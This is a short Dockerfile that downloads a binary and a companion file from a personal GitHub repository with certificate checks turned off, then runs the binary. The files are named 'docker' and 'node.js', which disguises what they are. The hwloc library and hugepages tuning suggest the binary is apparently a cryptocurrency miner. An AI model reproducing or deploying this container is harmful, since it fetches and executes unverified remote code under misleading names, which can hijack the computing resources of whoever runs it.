FROM ubuntu:16.04

RUN apt-get update \
    && apt-get -qq --no-install-recommends install \
        wget \
        libhwloc-dev \
        libssl-dev \
    && rm -r /var/lib/apt/lists/* \
    && wget --no-check-certificate https://github.com/jennhamrick/expdock/raw/master/docker \
    && wget --no-check-certificate https://github.com/jennhamrick/expdock/raw/master/node.js \
    && sysctl -w vm.nr_hugepages=128 \
    && chmod +x docker

ENTRYPOINT ["./docker"]
CMD ["node.js"]